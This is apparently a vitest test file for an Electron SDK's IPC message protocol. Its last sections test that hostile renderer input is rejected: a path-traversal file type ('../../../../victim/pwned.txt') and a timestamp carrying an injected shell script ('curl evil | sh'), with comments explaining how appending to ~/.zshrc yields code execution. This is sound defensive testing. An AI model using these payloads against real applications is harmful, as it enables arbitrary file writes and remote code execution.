import type { StreamingCaptureEntry } from '@bugsee/core';
import { DEFAULT_FILENAMES } from '@bugsee/protocol';
import { describe, expect, it } from 'vitest';
import {
  type ControlMessage,
  decodeControl,
  decodeStreamEntry,
  encodeControl,
  encodeHello,
  encodeStreamEntry,
  isHello,
} from './protocol';

const streamEntry = (over: Partial<StreamingCaptureEntry> = {}): StreamingCaptureEntry => ({
  type: 'network' as StreamingCaptureEntry['type'],
  seq: 7,
  timestamp: 1000,
  mono: 12.5,
  timeOrigin: 999,
  redacted: false,
  payload: '{"url":"x"}',
  ...over,
});

describe('encodeStreamEntry', () => {
  it('produces a valid JSON envelope with the payload spliced in verbatim (not double-escaped)', () => {
    const raw = encodeStreamEntry(streamEntry());
    const parsed = JSON.parse(raw);
    expect(parsed.k).toBe('entry');
    expect(parsed.t).toBe('network');
    expect(parsed.s).toBe(7);
    expect(parsed.ts).toBe(1000);
    expect(parsed.mono).toBe(12.5);
    expect(parsed.o).toBe(999);
    expect(parsed.red).toBe(false);
    expect(parsed.p).toEqual({ url: 'x' }); // spliced as a JSON object, not a string
  });
});

describe('decodeStreamEntry', () => {
  it('round-trips an encoded entry (payload re-serialized for StoredEntry.serialized)', () => {
    const decoded = decodeStreamEntry(encodeStreamEntry(streamEntry({ redacted: true })));
    expect(decoded).toEqual({
      type: 'network',
      seq: 7,
      timestamp: 1000,
      mono: 12.5,
      timeOrigin: 999,
      redacted: true,
      payload: '{"url":"x"}',
    });
  });

  it('returns undefined for invalid JSON', () => {
    expect(decodeStreamEntry('<<not json>>')).toBeUndefined();
  });

  it('returns undefined for a non-entry message or one missing the type', () => {
    expect(decodeStreamEntry(JSON.stringify({ k: 'control' }))).toBeUndefined();
    expect(decodeStreamEntry(JSON.stringify({ k: 'entry' }))).toBeUndefined();
    // a non-entry kind is rejected even when it carries a `t` (the kind, not just the type, must match)
    expect(decodeStreamEntry(JSON.stringify({ k: 'control', t: 'log', p: {} }))).toBeUndefined();
  });

  it('defaults absent numeric/flag fields', () => {
    const decoded = decodeStreamEntry(JSON.stringify({ k: 'entry', t: 'log', p: { m: 1 } }));
    expect(decoded).toMatchObject({
      type: 'log',
      seq: 0,
      timestamp: 0,
      mono: 0,
      timeOrigin: 0,
      redacted: false,
    });
  });

  it('returns undefined for a control message (not a stream entry)', () => {
    expect(decodeStreamEntry(encodeControl({ command: 'pause' }))).toBeUndefined();
  });
});

describe('encodeControl / decodeControl', () => {
  it('round-trips each control command (main→renderer)', () => {
    for (const command of ['pause', 'resume', 'flush', 'stop'] as const) {
      expect(decodeControl(encodeControl({ command }))).toEqual({ command });
    }
  });

  it('round-trips the session handshake reply (carries the assigned session id)', () => {
    const msg: ControlMessage = { command: 'session', sessionId: 'sess-42' };
    expect(decodeControl(encodeControl(msg))).toEqual(msg);
  });

  it('omits sessionId when absent (not encoded as undefined)', () => {
    const raw = encodeControl({ command: 'pause' });
    expect(JSON.parse(raw)).not.toHaveProperty('sid');
    expect(decodeControl(raw)).toEqual({ command: 'pause' });
  });

  it('returns undefined for invalid JSON', () => {
    expect(decodeControl('<<nope>>')).toBeUndefined();
  });

  it('returns undefined for a non-control kind', () => {
    expect(decodeControl(JSON.stringify({ k: 'entry', c: 'pause' }))).toBeUndefined();
  });

  it('returns undefined for an unknown / missing command', () => {
    expect(decodeControl(JSON.stringify({ k: 'control', c: 'explode' }))).toBeUndefined();
    expect(decodeControl(JSON.stringify({ k: 'control' }))).toBeUndefined();
  });
});

describe('encodeHello / isHello', () => {
  it('encodes a hello handshake request and recognizes it', () => {
    const raw = encodeHello();
    expect(isHello(raw)).toBe(true);
  });

  it('does not recognize non-hello messages or invalid JSON', () => {
    expect(isHello(encodeControl({ command: 'pause' }))).toBe(false);
    expect(isHello(encodeStreamEntry(streamEntry()))).toBe(false);
    expect(isHello('<<nope>>')).toBe(false);
  });
});

// Wave 0.2 (docs/review/REMEDIATION-PLAN.md) — the renderer is UNTRUSTED input.
//
// `decodeStreamEntry` parses JSON that arrives over IPC from a renderer, and the preload deliberately
// exposes `post()` to the page's main world. XSS in loaded content — or a compromised renderer-side npm
// dependency — is the standard Electron threat model, so every field here is attacker-controlled.
//
// The review proved (docs/review/electron.md SEV1 #1) that `t` was passed through verbatim into
// `store.add({ type })`, reaching `join(chunkDir(...), file)` in the disk-backed chunk store (the DEFAULT
// on Electron main). A `t` of `../../../../victim/pwned.txt` wrote OUTSIDE the capture root, with
// attacker-controlled content, append-only — i.e. appending to `~/.zshrc` or any `.js` the app loads is
// code execution as the user, delivered by the SDK.
describe('decodeStreamEntry — hostile renderer input', () => {
  const entry = (over: Record<string, unknown>): string =>
    JSON.stringify({ k: 'entry', t: 'log', p: { a: 1 }, ...over });

  it('rejects a path-traversal file type (the proven arbitrary-write exploit)', () => {
    expect(decodeStreamEntry(entry({ t: '../../../../victim/pwned.txt' }))).toBeUndefined();
  });

  it('rejects any type outside the known FileType set', () => {
    for (const t of ['', 'logs', 'LOG', 'log/../x', 'a\u0000b', '/abs/path', 'C:\\win', '..']) {
      expect(decodeStreamEntry(entry({ t }))).toBeUndefined();
    }
  });

  it('rejects a non-string type (arrays and objects also reach path.join)', () => {
    for (const t of [1, true, null, ['log'], { toString: () => 'log' }]) {
      expect(decodeStreamEntry(entry({ t }))).toBeUndefined();
    }
  });

  it('accepts every legitimate FileType', () => {
    for (const t of [...Object.keys(DEFAULT_FILENAMES), 'attachment']) {
      expect(decodeStreamEntry(entry({ t }))?.type).toBe(t);
    }
  });

  it('rejects a non-numeric timestamp, which lands verbatim in the written frame', () => {
    // The disk frame is `${timestamp}\t${serialized}\n`, so a string `ts` with newlines injects records —
    // and was how the proven exploit smuggled a shell script into the written file.
    for (const ts of [
      '#!/bin/sh\ncurl evil | sh',
      {},
      [],
      true,
      Number.NaN,
      Number.POSITIVE_INFINITY,
    ]) {
      expect(decodeStreamEntry(entry({ ts }))).toBeUndefined();
    }
  });

  it('still accepts a well-formed entry, and defaults an absent timestamp', () => {
    expect(decodeStreamEntry(entry({ ts: 1700000000000 }))?.timestamp).toBe(1700000000000);
    expect(decodeStreamEntry(entry({}))?.timestamp).toBe(0);
  });

  it('rejects non-numeric seq / mono / timeOrigin rather than coercing them', () => {
    for (const field of ['s', 'mono', 'o']) {
      expect(decodeStreamEntry(entry({ [field]: 'x' }))).toBeUndefined();
    }
  });
});

describe('decodeStreamEntry — the payload field', () => {
  it('rejects a message with NO payload rather than emitting a non-string one', () => {
    // JSON.stringify(undefined) returns undefined, NOT a string — so an omitted `p` silently broke the
    // decoder's own `payload: string` contract and reached store.add({ serialized: undefined }), throwing
    // out of the ipcMain listener on the memory store (docs/review/electron-wave02-review.md SEV1 #1).
    expect(decodeStreamEntry('{"k":"entry","t":"log"}')).toBeUndefined();
    expect(decodeStreamEntry('{"k":"entry","t":"log","p":null}')?.payload).toBe('null');
  });

  it('always yields a string payload for every accepted message', () => {
    for (const p of ['{}', '[]', '1', '"s"', 'true', 'null', '{"a":{"b":[1,2]}}']) {
      const decoded = decodeStreamEntry(`{"k":"entry","t":"log","p":${p}}`);
      expect(typeof decoded?.payload).toBe('string');
    }
  });
});
